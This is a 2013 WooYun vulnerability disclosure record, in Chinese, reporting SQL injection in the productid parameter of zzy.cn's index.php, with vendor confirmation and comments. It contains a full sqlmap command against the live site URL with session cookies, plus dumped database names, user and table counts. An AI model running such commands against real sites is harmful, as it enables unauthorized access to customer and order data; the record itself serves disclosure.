{"id": 62456, "wybug_id": "wooyun-2013-035596", "wybug_title": "中资源主站SQL注入漏洞一枚（数据库可读写）", "wybug_corp": "zzy.cn", "wybug_author": "雨夜", "wybug_date": "2013-08-29 14:58", "wybug_open_date": "2013-10-13 14:59", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-08-29：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-08-29：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-09-08：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-09-18：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-09-28：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-10-13：\t细节向公众公开  简要描述： 危害也一般般，就是能读读订单，改改产品信息和价钱。哦，还能改改广告哦，还能改DNS？ 详细说明：  漏洞地址在index.php对于post参数productid没有过滤导致了SQL注入的产生能读文件，可以跨库查询，可以获取一些订单的信息，数据库如下\n[*] ad[*] information_schema[*] sys[*] test[*] zzydb\nzzydb是当前的库，ad库也可以直接查询修改web application technology: Apache 2.4.6, PHP 5.5.1back-end DBMS: MySQL >= 5.0.0[14:33:10] [INFO] fetching database users[14:33:10] [INFO] the SQL query used returns 1 entries[14:33:10] [INFO] resumed: 'zzy'@'localhost'database management system users [1]:[*] 'zzy'@'localhost'直接来个sqlmap的地址吧\nsqlmap.py -u \"http://www.zzy.cn/index.php?L=domainreg_info\" --data \"applytime=2&contacter=%e5%a4%a7%e7%88%b7&domainreg_info=%e7%ab%8b%e5%8d%b3%e8%b4%ad%e4%b9%b0&telephoneno=010-88787766&type=0&visitor_id=0&productid=1\" -p productid --dbms=mysql --cookie \"PHPSESSID=2a66vld8f44q5ihpr7npv2im05; tr_id=1377744881605_8523; tr_lasttime=1377744881610; tr_visitcount=0; tr_lastpage=http://www.zzy.cn/index.php; tr_pagedepth=4; tr_onlinestart=Thu Aug 29 2013 13:18:13 GMT+0800 (中国标准时间); chatOnlyCookies=137774488171135574\" -D zzydb --dump --start 1 --stop 10 -T mailprice\n   漏洞证明：  以上的SQLMAP是猜解zzydb表中mailprice字段1-10条的内容。内容为\n\n还有不少关于交易和订单信息的表，没有全部去看以下是数据库中各表中的数据数\n---web application technology: Apache 2.4.6, PHP 5.5.1back-end DBMS: MySQL >= 5.0.0Database: zzydb+----------------------+---------+| Table                | Entries |+----------------------+---------+| userlevel            | 66120   || visitor              | 54570   || visitor_productorder | 10126   || zzy_areacodeinfo     | 3573    || jcdm_areacodeinfo    | 3537    || rolelevelorder       | 628     || product              | 272     || role                 | 238     || hostperformance      | 60      || mailprice            | 32      || hostproduct          | 18      || mailtemplate         | 11      || bandwith             | 6       || dns                  | 2       |+----------------------+---------+\nproduct表中的部分内容，没转码，有乱码\n\n   修复方案：  修复吧，需要复查其他url，肯定还有类似参数没有过滤。   版权声明：转载请注明来源 雨夜@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2013-08-29 15:18 厂商回复： 由于编码人员疏失导致的低级错误，我们目前已立刻展开修复处理。非常感谢白帽子的及时提醒！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-08-29 14:58 |    \t\ttzrj \t\t\t( 实习白帽子  |\t\t\t        Rank:87 漏洞数:24        | 1111)\t\t \n  good    \n     2013-08-30 00:00 |    \t\t大土豆 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 土豆马铃薯洋芋)\t\t \n  才给10    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 10, "Ranks": null}